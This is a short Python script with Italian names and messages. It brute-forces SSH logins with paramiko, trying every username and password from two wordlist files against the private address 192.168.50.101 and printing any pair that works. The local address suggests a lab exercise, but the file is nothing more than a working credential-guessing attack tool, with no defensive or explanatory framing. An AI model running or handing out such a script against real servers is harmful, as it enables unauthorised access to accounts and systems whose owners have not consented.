import paramiko

lista_utenti = open('Nome_Utenti.txt').read().splitlines()
lista_passwords = open('Nome_Password.txt').read().splitlines()
ip = "192.168.50.101"

for utenti in lista_utenti:
    for passw in lista_passwords:
        print(f"Provo {utenti}:{passw}")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(ip, 22, utenti, passw, timeout=3)
            print(f"\n TROVATO! User: {utenti} | Pass: {passw}")
            exit()
        except:
            pass
        finally:
            ssh.close()
            

print(" Non trovato")
